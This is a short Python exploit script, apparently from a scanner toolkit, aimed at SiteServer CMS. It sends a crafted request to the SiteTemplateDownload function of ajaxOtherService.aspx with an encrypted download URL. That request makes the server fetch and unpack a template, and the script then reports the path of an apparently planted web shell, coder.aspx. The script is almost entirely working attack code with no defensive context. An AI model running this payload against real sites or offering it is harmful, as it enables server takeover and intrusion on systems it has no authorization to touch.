#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=Mu4qBmu7IHKCg30uPHV54RvihWpSgPTpjdF9n0yrTMz9pqoVmJBC0slash0A0equals00equals0&directoryName=fctest"
bug ="站点模板下载成功"
info ="/SiteFiles/SiteTemplates/fctest/coder.aspx"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
